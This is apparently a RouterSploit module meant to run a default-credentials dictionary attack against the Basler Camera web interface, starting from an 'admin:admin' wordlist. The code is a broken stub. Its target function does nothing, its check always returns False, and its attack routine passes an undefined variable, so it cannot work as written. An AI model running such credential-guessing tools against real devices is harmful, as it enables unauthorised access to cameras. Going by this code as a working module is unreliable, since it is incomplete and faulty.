from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Basler Camera Default Web Interface Creds - HTTP Form",
        "description": "Module performs dictionary attack against Basler Camera Web Interface. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": [
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ],
        "devices": [
            "Basler Camera",
        ]
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")

    stop_on_success = OptBool("false", "Stop on first valid authentication attempt")
    verbosity = OptBool("true", "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack against web interface")

        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, data):
        pass

    @mute
    def check(self):
        return False

    @mute
    def check_default(self):
        return None

